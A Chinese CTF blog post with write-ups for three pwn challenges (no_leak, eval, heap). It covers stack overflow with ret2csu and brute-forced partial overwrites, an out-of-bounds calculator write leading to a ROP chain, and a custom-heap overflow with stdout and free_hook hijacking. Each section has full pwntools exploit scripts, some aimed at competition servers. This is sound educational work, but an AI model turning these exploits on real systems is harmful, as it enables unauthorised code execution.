---
title: PWN challenge 题目精解
date: 2023-10-08 07:54:59 +0800
categories: [ctf比赛]
tags: [pwn, ctf]
permalink: /posts/id=74/
pin: false
published:
---



这篇文章主要是对pwn题目的详细分析，开始的题目是以Ex师傅的CTF平台https://pwn.xmcve.com/challenge.php开始的，由于后边的题目比较难，所以会选择别的题目来分析，那么开始吧。

## no_leak

题目主要是一个栈溢出，没有任何用于输出的函数

```bash
[*] '/mnt/hgfs/ctf/pwnchall/no_leak/no_leak'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

由于没有地址随机化，我们掌握的地址有程序所有的基址，即got表、bss段地址、程序自身的gadget等

这种情况下，我们可以考虑csu的gadget（Full RELRO我们可以使用call got表、没有PIE有地址、缺少gadget）

如何拿到libc地址就是关键

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  alarm(0x3Cu);
  read(0, buf, 0x100uLL);
  return 0;
}
```



### 利用__libc_start_main函数在bss段上布置libc地址

这种思路主要是放弃泄露libc，只要libc地址在已知地址为我们所用即可

利用gadget对bss段上残留的libc地址进行加减得到system，再通过栈溢出调用bss地址上的system函数

csu的优点之一就是能控制rbp和rbx寄存器

我们搜索一下gadget

```bash
➜  no_leak ROPgadget --binary no_leak | grep "bp"
0x000000000040052c : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
0x000000000040052d : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4004c0
0x00000000004004b6 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040052e : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
0x00000000004004b5 : add byte ptr [rax], r8b ; pop rbp ; ret
0x000000000040052f : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4004c0
0x0000000000400517 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
0x00000000004004a9 : je 0x4004b8 ; pop rbp ; mov edi, 0x601010 ; jmp rax
0x00000000004004eb : je 0x4004f8 ; pop rbp ; mov edi, 0x601010 ; jmp rax
0x00000000004006db : jmp qword ptr [rbp]
0x0000000000400512 : mov byte ptr [rip + 0x200af7], 1 ; pop rbp ; ret
0x0000000000400532 : mov ebp, esp ; pop rbp ; jmp 0x4004c0
0x0000000000400531 : mov rbp, rsp ; pop rbp ; jmp 0x4004c0
0x00000000004004b3 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004004f5 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400515 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400534 : pop rbp ; jmp 0x4004c0
0x00000000004004ab : pop rbp ; mov edi, 0x601010 ; jmp rax
0x00000000004005cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004005cf : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004004b8 : pop rbp ; ret
0x0000000000400530 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
```

能用的gadget肯定是以ret结尾的，其中又要能对rbx或者rbp里的内容进行加减的

```bash
0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
```

这条gadget能操作rbp里存放的值，我们如果把rbp设置为bss地址就能实现我们的目的

如何在bss上残留libc地址呢，__libc_start_main函数执行时会在函数执行位置上下文残留一些地址，其中包括了一些libc地址。如`__exit_funcs_lock`，把 libc_start_main函数布置到bss段上，栈迁移过去执行，执行的参数为p64(start)+p64(fini)+p64(init)(实测执行`_start`是行不通的，需要执行`__libc_start_main`）

> 栈迁移的方式有很多
>
> 1.三条payload read的方式，用于溢出空间不大的栈溢出
>
> 2.利用一条溢出rsu call read_got，再一条溢出设置rbp leave ret的方式，用于有次数限制的情况
>
> ......

在新的main函数流中栈溢出执行我们的加减gadget，计算system和__exit_funcs_lock的差值。整体的思路如下所示。

EXP仅供参考，有多处可优化：

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256
 
# p = remote("nc.eonew.cn","10002")
p = process("./no_leak")
elf = ELF("./no_leak")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

# ru("------------------------------   preload end     ------------------------------")


# 0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
magic = 0x0000000000400518
alarm = 0x600FE0
bss = 0x601400
read = 0x400549

libc_main = elf.got['__libc_start_main']
lg("libc_main")
main = 0x400537
csu2 = 0x4005CA
csu1 = 0x4005B0
fini = 0x4005E0
init = 0x400570
start = 0x400450

pay = 'a'*0x80+p64(bss)+p64(read)
s(pay)

pay = 'a'*0x80+p64(bss+0x80)+p64(read)
s(pay)

pay = p64(0)+p64(csu2)+p64(0)+p64(1)+p64(libc_main)+p64(start)+p64(fini)+p64(init)+p64(csu1)
s(pay)

pay  = 'a'*0x80+p64(bss)+p64(csu2)
pay += p64(0xffffffffffc5ed18)+p64(0x601340+0x3d)+p64(0)*4
pay += p64(magic)+p64(main)
s(pay)

# dbg()
pay ='/bin/sh\x00'+'b'*0x80+p64(csu2)
pay += p64(0)+p64(1)+p64(0x601340)+p64(0x601268)+p64(0)+p64(0)+p64(csu1)
s(pay)
# p.recv(timeout=0.2)
# p.recv(timeout=0.2)

ia()
```

### 利用__libc_start_main中的输出函数gadget泄露libc

最好的情况是把libc泄露出来方便我们计算，寻求泄露函数只能求于libc，我们注意到在libc函数流程中存在一个输出函数片段

```
.text:0000000000021B3B                               loc_21B3B:                              ; CODE XREF: __libc_start_main+8F↑j
.text:0000000000021B3B 48 8B 44 24 08                mov     rax, [rsp+0B8h+var_B0]
.text:0000000000021B40 48 8B 15 11 C3 38 00          mov     rdx, cs:_rtld_global_ro_ptr
.text:0000000000021B47 48 8D 3D A1 3C 15 00          lea     rdi, aTransferringCo            ; "\ntransferring control: %s\n\n"
.text:0000000000021B4E 48 8B 30                      mov     rsi, [rax]
.text:0000000000021B51 31 C0                         xor     eax, eax
.text:0000000000021B53 FF 92 68 01 00 00             call    qword ptr [rdx+168h]
.text:0000000000021B53
.text:0000000000021B59 E9 D7 FE FF FF                jmp     loc_21A35
```

会输出rax的内容，而rax来自于rsp+0x8+var_B0，结合我们已经有了溢出，rax似乎是可以控制的，如果控制为got表项就能泄露libc。

而jmp loc_21A35则是跳转到`__libc_start_main`的主逻辑部分正常执行，满足我们的要求

```
.text:0000000000021A35                               loc_21A35:                              ; CODE XREF: __libc_start_main+1B9↓j
.text:0000000000021A35 48 8D 7C 24 20                lea     rdi, [rsp+0B8h+var_98]          ; env
.text:0000000000021A3A E8 F1 29 01 00                call    _setjmp
.text:0000000000021A3A
.text:0000000000021A3F 85 C0                         test    eax, eax
.text:0000000000021A41 75 4B                         jnz     short loc_21A8E
.text:0000000000021A41
.text:0000000000021A43 64 48 8B 04 25 00 03 00 00    mov     rax, fs:300h
.text:0000000000021A4C 48 89 44 24 68                mov     [rsp+0B8h+var_50], rax
.text:0000000000021A51 64 48 8B 04 25 F8 02 00 00    mov     rax, fs:2F8h
.text:0000000000021A5A 48 89 44 24 70                mov     [rsp+0B8h+var_48], rax
.text:0000000000021A5F 48 8D 44 24 20                lea     rax, [rsp+0B8h+var_98]
.text:0000000000021A64 64 48 89 04 25 00 03 00 00    mov     fs:300h, rax
.text:0000000000021A6D 48 8B 05 34 C4 38 00          mov     rax, cs:environ_ptr
.text:0000000000021A74 48 8B 74 24 08                mov     rsi, [rsp+0B8h+var_B0]
.text:0000000000021A79 8B 7C 24 14                   mov     edi, [rsp+0B8h+var_A4]
.text:0000000000021A7D 48 8B 10                      mov     rdx, [rax]
.text:0000000000021A80 48 8B 44 24 18                mov     rax, [rsp+0B8h+var_A0]
.text:0000000000021A85 FF D0                         call    rax
.text:0000000000021A85
.text:0000000000021A87
.text:0000000000021A87                               loc_21A87:                              ; CODE XREF: __libc_start_main+156↓j
.text:0000000000021A87 89 C7                         mov     edi, eax
.text:0000000000021A89 E8 12 53 01 00                call    exit
```



我们注意到返回地址本就是`__libc_start_main`加上偏移的地址，所以我们爆破0x21B3B 地址，来实现功能。再根据动调判断执行mov     rax, [rsp+0B8h+var_B0]时取的是栈上的哪个值，溢出覆盖即可。

```python
# 第一次溢出
p =  'a' * 0x80
p += p64(rbp)
p += p64(_start)
p += '\x00'*8
p += p64(elf.got['read']) 
```

拿到libc后就不再赘述，rop即可



EXP仅供参考，有多处可优化：

```python
# _*_ coding:utf-8 _*_
from pwn import *

context.log_level = 'debug'
elf = ELF('./no_leak')
libc_path = './libc.so.6'
libc = ELF(libc_path)
io = elf.process()
# io = remote('nc.eonew.cn', 10002)

# io.recvuntil("------------------------------   preload end     ------------------------------\n")

context.terminal = ['tmux', 'splitw', '-hp','64']

def dbg(breakpoint=''):
    gdb.attach(io)
    pause()

# dbg()

_start = 0x400450
leave = 0x400564
main = 0x400537
pop_rdi = 0x00000000004005d3 # pop rdi ; ret
pop_rsi_r15 = 0x00000000004005d1 # pop rsi ; pop r15 ; ret
__libc_csu_init_gadget      = 0x4005CB # __libc_scu_init pop_5_ret
__libc_csu_init_gadget_call = 0x4005B0 #
buf = elf.bss() + 0x800
rbp = buf - 8

p = b'A' * 0x80
p += p64(rbp)
p += p64(_start)
p += '\x00'*8
p += p64(elf.got['read']) 

io.send(p)

# leak libc
p =  b'A' * 0x88
p += b'\x3b\x7b'

io.send(p)
libc_base = u64(io.recvuntil('\x7f')[-6:] + b'\x00\x00') - libc.sym['read']
print('libc_base: ' + hex(libc_base))
sleep(0.5)

p = b'A' * 0x80 + b'/bin/sh\x00'
p += p64(pop_rdi)
p += p64(0x601740)
p += p64(libc_base + libc.sym['system'])
io.send(p)

io.interactive()
```



### 直接溢出爆破one_gadget

既然能爆破，那自然直接爆破one_gadget也是可以的，概率比较低就是了

```python
from pwn import *

count=1

while True:
        io=remote("nc.eonew.cn",10002)
        io.send('A'*0x80+'A'*8+'\xa6\x15\x04')
        io.recv()
        print(count)
        count += 1
        try:    
                io.recv(timeout=0.2)
                io.recv(timeout=0.2)
        except:
                io.close()
                continue
        break
io.interactive()
```



## eval

这题是2023柏鹭杯的一道计算器的题目，逆向难度还是比较大的

这题的切入点是从一个crash开始，如果已知crash该如何分析题目并编写脚本

```shell
➜  2023bolucup ./eval
+23232323232323
[1]    72101 segmentation fault (core dumped)  ./eval
```

进一步测试，会发现会输出一些栈地址

```shell
➜  2023bolucup ./eval
+100
140725581820903
```

这意味着它的输出结果是存在越界的

来看它的处理函数，输出函数输出的是res+0x18 + *(res+0x18)\*8，那么越界极有可能就是\*(res+18)导致的

```c
int __fastcall vuln(const char *buf, __int64 result)
{
  char num; // [rsp+1Fh] [rbp-11h]
  const char *nextnum; // [rsp+20h] [rbp-10h]
  __int64 i; // [rsp+28h] [rbp-8h]

  memset(result, 0, 0xA0uLL);
  nextnum = buf;
  for ( i = 0LL; ; ++i )
  {
    num = buf[i];
    if ( !isfuhao(num) )
      break;
    sub_DC9(result, nextnum, &buf[i]);
    if ( !isNum(buf[i + 1]) )
      error();
    sub_CB1(result, num);
    nextnum = &buf[i + 1];
LABEL_8:
    ;
  }
  if ( num )
    goto LABEL_8;
  sub_DC9(result, nextnum, &buf[i]);
  while ( *result )
    sub_AC7(result);
  return printf("%ld\n", *(result + 8 * (*(result + 0x18) - 1LL + 4)));
}
```

再来看程序

如果我们输入+100，进入for循环后判断+为符号，然后就进入sub_DC9，符号置为0，strtol返回0，继续循环，判断其后是否为数字，进入sub_CB1，此时的res还为0，将其+1,将+符号赋给(res+8)，就返回0了。

然后进入下一次for循环，只要读到的是数字则跳过，直到读到0。然后再进行一次sub_DC9，将其后的数字(字符串)转化为long int，初始化(res+0x18)为1，将long int 放入(res+0x20)

```c
_BYTE *__fastcall sub_DC9(__int64 a1, const char *a2, _BYTE *a3)
{
  _BYTE *result; // rax
  __int64 v4; // rax
  __int64 v5; // rcx
  char v7; // [rsp+27h] [rbp-9h]
  _BYTE *v8; // [rsp+28h] [rbp-8h]

  if ( *a2 == '0' )
    error();
  v7 = *a3;
  *a3 = 0;                                      // 符号值为零
  v8 = strtol(a2, 0LL, 10);
  result = a3;
  *a3 = v7;
  if ( v8 )
  {
    v4 = *(a1 + 0x18);
    *(a1 + 0x18) = v4 + 1;
    v5 = v4 + 4;
    result = v8;
    *(a1 + 8 * v5) = v8;                        // 数字
  }
  return result;
}
```

```c
__int64 __fastcall sub_CB1(_QWORD *res, char num)
{
  __int64 s; // rax

  if ( !*res )
  {
    s = (*res)++;
    *(res + s + 8) = num;
    return s;
  }
  if ( num != '+' )
  {
    if ( num <= '+' )
    {
      if ( num != '*' )
LABEL_16:
        error();
      goto LABEL_8;
    }
    if ( num != '-' )
    {
      if ( num != '/' )
        goto LABEL_16;
LABEL_8:
      if ( sub_91A(*(res + *res + 7)) )
        sub_AC7(res);
      if ( *res > 0xEuLL )
        error();
      s = (*res)++;
      *(res + s + 8) = num;
      return s;
    }
  }
  sub_AC7(res);
  if ( *res > 0xEuLL )
    error();
  s = (*res)++;
  *(res + s + 8) = num;
  return s;
}
```

由于res为1，接下来进入到sub_AC7，对res-1，又变为0，读取符号，根据符号来对基于(res + 0x18)进行加减法操作，*(res+0x20）+1 赋值给 *(res+0x18) ， *(res+0x18) 又减一。

```c
struc_2 *__fastcall sub_AC7(__int64 a1)
{
  struc_2 *result; // rax
  int v2; // eax

  result = *a1;
  if ( *a1 )
  {
    --*a1;
    v2 = *(a1 + *a1 + 8);
    if ( v2 == '+' )
    {
      *(a1 + 8 * (*(a1 + 0x18) - 2LL + 4)) += *(a1 + 8 * (*(a1 + 0x18) - 1LL + 4));
    }
    else if ( v2 > '+' )
    {
      if ( v2 == '-' )
      {
        *(a1 + 8 * (*(a1 + 0x18) - 2LL + 4)) -= *(a1 + 8 * (*(a1 + 24) - 1LL + 4));
      }
      else
      {
        if ( v2 != '/' )
LABEL_15:
          error();
        if ( !*(a1 + 8 * (*(a1 + 24) - 1LL + 4)) )
          error();
        *(a1 + 8 * (*(a1 + 24) - 2LL + 4)) /= *(a1 + 8 * (*(a1 + 24) - 1LL + 4));
      }
    }
    else
    {
      if ( v2 != '*' )
        goto LABEL_15;
      *(a1 + 8 * (*(a1 + 24) - 2LL + 4)) *= *(a1 + 8 * (*(a1 + 24) - 1LL + 4));
    }
    result = a1;
    --*(a1 + 0x18);
  }
  return result;
}
```

走到这应该就明白了(res+0x18)是一个偏移量，但它的值却是(res+0x20)这个由我们输入的数字设置的。

接下来泄露libc即可，既然(res+0x18)是一个写入偏移，那第二次写入数字的偏移就同样改变，利用这一点就可以实现任意地址写

在栈上写入ropchin执行system("/bin/sh")

回看这道题目，主要是逻辑难以理解，ida反汇编的程序结构比较奇怪，让人很难快速找到漏洞点



EXP仅供参考：

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./eval")
elf = ELF("./eval")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------
# dbg(0xe0f)
# dbg(0xAF2)
p.sendline('+52')

libc_addr = int(p.recvline()) - 0x24083
success('libc_addr: ' + hex(libc_addr))

# dbg(0xF4E)
p.sendline(f'+54-{libc_addr + 0x52290}'.encode())
p.recvline()
p.sendline(f'+53-{libc_addr + 0x0000000000054310}'.encode())
p.recvline()
p.sendline(f'+52-{libc_addr + 0x1b45bd}'.encode())
p.recvline()
p.sendline(f'+51-{libc_addr + 0x0000000000023b6a}'.encode())
p.recvline()

p.sendline()

ia()
```



## heap

这题是2023柏鹭杯的另一道pwn题，常规菜单，很容易能发现漏洞点在于sub_DCC函数中存在堆溢出

```c
__int64 sub_DCC()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  printf("index: ");
  result = read_num();
  v1 = result;
  if ( result <= 0x1F )
  {
    result = ptr[result];
    if ( result )
    {
      printf("data: ");
      return read(0, ptr[v1], 0x1000uLL);
    }
  }
  return result;
}
```

题目的问题在于没有使用glibc的堆管理，而是自己写了一个malloc函数和free函数，其逆向程度同样很高，但和eval不一样的是，这题我们是知道如何触发漏洞点的，但是我们对堆的结构不了解，所以我们可以通过纯动调的方式来理解堆结构

```python
add(0x20)
add(0x20)
add(0x20)
add(0x20)
add(0x20)
dbg()
#delete(2)
#delete(1)
#delete(0)
#add(0x20)
#dbg()
```

动调测试

```shell
pwndbg> dq $rebase(0x2030E0)
000055acfac030e0     00007f3dcae09028 00007f3dcae09080
000055acfac030f0     00007f3dcae090d8 00007f3dcae09130
000055acfac03100     00007f3dcae09188 0000000000000000
000055acfac03110     0000000000000000 0000000000000000
pwndbg> dq 00007f3dcae09028 60
00007f3dcae09028     0000000000000000 0000000000000000
00007f3dcae09038     0000000000000000 0000000000000000
00007f3dcae09048     0000000000000000 0000000000000000
00007f3dcae09058     441a12390ea44d00 00000031aaaaaaaa
00007f3dcae09068     00007f3dcae090b0 0000000000000000
00007f3dcae09078     0000000000000000 0000000000000000
00007f3dcae09088     0000000000000000 0000000000000000
00007f3dcae09098     0000000000000000 0000000000000000
00007f3dcae090a8     0000000000000000 15e9be126d128400
00007f3dcae090b8     00000031aaaaaaaa 00007f3dcae09108
00007f3dcae090c8     0000000000000000 0000000000000000
00007f3dcae090d8     0000000000000000 0000000000000000
00007f3dcae090e8     0000000000000000 0000000000000000
00007f3dcae090f8     0000000000000000 0000000000000000
00007f3dcae09108     6f3bc3355c16f900 00000031aaaaaaaa
00007f3dcae09118     00007f3dcae09160 0000000000000000
00007f3dcae09128     0000000000000000 0000000000000000
00007f3dcae09138     0000000000000000 0000000000000000
00007f3dcae09148     0000000000000000 0000000000000000
00007f3dcae09158     0000000000000000 1f9d040849124f00
00007f3dcae09168     00000031aaaaaaaa 0000000000000000
00007f3dcae09178     0000000000000000 0000000000000000
00007f3dcae09188     0000000000000000 0000000000000000
00007f3dcae09198     0000000000000000 0000000000000000
```

我们发现申请的堆通过链表在管理。

除了一个key、标志size位、aaaaaaaa外，还有一个函数指针指向下一个chunk的head头的指针

接下来观察free后的变化(地址后三位是不变的)

```c
add(0x20)
add(0x20)
add(0x20)
add(0x20)
add(0x20)
delete(2)
delete(1)
delete(0)
dbg()
```



```shell
pwndbg> dq 0x0007fe70c574028-0x60 100
00007fe70c573fc8     0000000000000000 0000000000000000
00007fe70c573fd8     0000000000000000 0000000000000000
00007fe70c573fe8     0000000000000000 0000000000000000
00007fe70c573ff8     0000000000000000 5b6f69427e251400
00007fe70c574008     00000030aaaaaaaa 00007fe70c574058
00007fe70c574018     00007fe70c574058 0000000000000000
00007fe70c574028     0000000000000000 0000000000000000
00007fe70c574038     0000000000000000 0000000000000000
00007fe70c574048     0000000000000000 0000000000000000
00007fe70c574058     0a50bd2c157fe100 00000030aaaaaaaa
00007fe70c574068     00007fe70c5740b0 00007fe70c5740b0
00007fe70c574078     0000000000000000 0000000000000000
00007fe70c574088     0000000000000000 0000000000000000
00007fe70c574098     0000000000000000 0000000000000000
00007fe70c5740a8     0000000000000000 3677f0c513b18f00
00007fe70c5740b8     00000030aaaaaaaa 00007fe70c574108
00007fe70c5740c8     0000000000000000 0000000000000000
00007fe70c5740d8     0000000000000000 0000000000000000
00007fe70c5740e8     0000000000000000 0000000000000000
00007fe70c5740f8     0000000000000000 0000000000000000
00007fe70c574108     5569304f1084bd00 00000031aaaaaaaa
00007fe70c574118     00007fe70c574160 0000000000000000
00007fe70c574128     0000000000000000 0000000000000000
00007fe70c574138     0000000000000000 0000000000000000
00007fe70c574148     0000000000000000 0000000000000000
00007fe70c574158     0000000000000000 072959291e153800
00007fe70c574168     00000031aaaaaaaa 0000000000000000
00007fe70c574178     0000000000000000 0000000000000000
00007fe70c574188     0000000000000000 0000000000000000
00007fe70c574198     0000000000000000 0000000000000000
00007fe70c5741a8     0000000000000000 0000000000000000
00007fe70c5741b8     0000000000000000 0000000000000000
00007fe70c5741c8     0000000000000000 0000000000000000
00007fe70c5741d8     0000000000000000 0000000000000000
```

我们发现每个chunk新增了一个指针，我们预期的情况是

```
0->1->2
```

新增的指针符合我们的预期，那我们判断该指针可能为free_chunk的fd指针

后续的思路就是劫持free_hook为后门函数打出环境变量里的flag，这里的free_hook是个bss段变量，因此我们需要程序的基地址。

由于有了任意地址写，考虑劫持stdout实现泄露出程序基地址，程序调用libc会产生地址上的交互。

```shell
pwndbg> search libc.so.6
Searching for value: 'libc.so.6'
heap            0x563314e04201 'libc.so.6'
libc-2.31.so    0x7fe70c68be01 'libc.so.6'
[anon_7fe70c862] 0x7fe70c8664a0 'libc.so.6'
[anon_7fe70c862] 0x7fe70c8664eb 'libc.so.6'
[anon_7fe70c897] 0x7fe70c897f6b 'libc.so.6'
pwndbg> search -p 0x563314e04201
Searching for value: b'\x01B\xe0\x143V\x00\x00'
[anon_7fe70c862] 0x7fe70c8665b0 0x563314e04201
[anon_7fe70c862] 0x7fe70c8665c8 0x563314e04201
[stack]         0x7fff79ee0ab8 0x563314e04201
[stack]         0x7fff79ee1050 0x563314e04201
```

再同样的方式劫持free_hook即可

由于不知道远程的libc版本，也没给libc，但是应该可以通过stdout去泄露几个libc函数来判断版本



EXP仅供参考，不唯一

```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')

sh = remote('8.130.120.45', 20199)

def add(size):
    sh.sendlineafter(b'> ', b'1')
    sh.sendlineafter(b'size: ', str(size).encode())

def delete(index):
    sh.sendlineafter(b'> ', b'2')
    sh.sendlineafter(b'index: ', str(index).encode())

def edit(index, data):
    sh.sendlineafter(b'> ', b'3')
    sh.sendlineafter(b'index: ', str(index).encode())
    sh.sendafter(b'data: ', data)

def show(index):
    sh.sendlineafter(b'> ', b'4')
    sh.sendlineafter(b'index: ', str(index).encode())

add(0x20)
add(0x20)
add(0x20)
add(0x20)
delete(1)
edit(0, b'a' * 0x31)
show(0)
sh.recvuntil(b'a' * 0x31)
guard = u64(b'\0' + sh.recvn(7))
success('guard: ' + hex(guard))
edit(0, b'a' * 0x40)
show(0)
sh.recvuntil(b'a' * 0x40)
heap_addr = u64(sh.recvn(6) + b'\0\0')
success('heap_addr: ' + hex(heap_addr))
libc_addr = heap_addr + 0xfff50
success('libc_addr: ' + hex(libc_addr))
edit(0, b'a' * 0x30 + p64(guard) + b'a' * 0x10 + p64(heap_addr+0x2ed5f0-0x28))
add(0x20)
add(0x20)
edit(4, flat([0xfbad3887, 0, 0, 0, libc_addr + 0x1f2570, libc_addr + 0x1f2578, libc_addr + 0x1f2578, libc_addr + 0x1f2578]))
image_addr =  u64(sh.recvn(8)) - 0x609
success('image_addr: ' + hex(image_addr))

delete(1)
edit(0, b'a' * 0x31)
show(0)
sh.recvuntil(b'a' * 0x31)
guard = u64(b'\0' + sh.recvn(7))
success('guard: ' + hex(guard))
edit(0, b'a' * 0x30 + p64(guard) + b'a' * 0x10 + p64(image_addr+0x2031E8-0x28))
add(0x20)
add(0x20)
edit(5, p64(image_addr + 0xEAD))
delete(1)

sh.interactive()
```





